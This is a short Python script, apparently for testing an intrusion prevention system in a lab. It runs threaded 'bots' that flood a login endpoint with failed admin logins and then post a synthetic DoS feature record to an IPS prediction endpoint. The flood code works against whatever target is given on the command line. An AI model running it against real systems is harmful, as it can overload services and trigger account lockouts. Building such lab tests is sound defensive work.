import requests
import time
import random
import threading
import argparse

# ---------------- ARGUMENTS ---------------- #
parser = argparse.ArgumentParser(description="Semi-Real DoS Attack (Safe Lab)")
parser.add_argument("target", help="Target IP (use 127.0.0.1)")
parser.add_argument("--bot-count", type=int, default=5, help="Number of virtual attackers")
parser.add_argument("--requests", type=int, default=200, help="Total requests per bot")
args = parser.parse_args()

TARGET_IP = args.target
BOT_COUNT = args.bot_count
REQ_PER_BOT = args.requests

# Target endpoints
LOGIN_URL = f"http://{TARGET_IP}:6000/login"
IPS_URL = f"http://{TARGET_IP}:5000/predict"

session = requests.Session()

# ---------------- GENERATE IPs ---------------- #
def generate_ips(count):
    if count == 1:
        return ["192.168.1.100"]
    return [f"192.168.1.{random.randint(2, 254)}" for _ in range(count)]

attack_ips = generate_ips(BOT_COUNT)

# ---------------- FLOOD FUNCTION ---------------- #
def flood(source_ip):
    for _ in range(REQ_PER_BOT):
        try:
            # 🔥 Real HTTP traffic to login server
            login_data = {
                "ip": source_ip,
                "username": "admin",
                "password": "wrong_pass"
            }
            session.post(LOGIN_URL, json=login_data, timeout=1)

        except:
            pass

# ---------------- IPS NOTIFY ---------------- #
def notify_ips():
    payload = {
        "ip": random.choice(attack_ips),
        "request_rate": random.randint(1500, 3000),
        "failed_logins": 0,
        "packet_size": random.randint(1000, 1500),
        "duration": 0.01,
        "protocol": "HTTP",
        "attack_type": "DoS"
    }

    try:
        res = session.post(IPS_URL, json=payload, timeout=2)
        print("IPS:", res.json())
    except Exception as e:
        print("IPS Error:", e)

# ---------------- MAIN ATTACK ---------------- #
def run_attack():
    print(f"🔥 Starting Semi-Real DoS Attack on {TARGET_IP}")
    print(f"⚡ Bots: {BOT_COUNT} | Requests per bot: {REQ_PER_BOT}")
    print("--------------------------------------------------")

    threads = []

    start_time = time.time()

    for i in range(BOT_COUNT):
        ip = attack_ips[i]
        t = threading.Thread(target=flood, args=(ip,))
        t.start()
        threads.append(t)

    # Wait for all bots
    for t in threads:
        t.join()

    end_time = time.time()

    print(f"✅ Flood completed in {round(end_time - start_time, 2)} sec")

    # Notify IPS once after flood
    notify_ips()


if __name__ == "__main__":
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped.")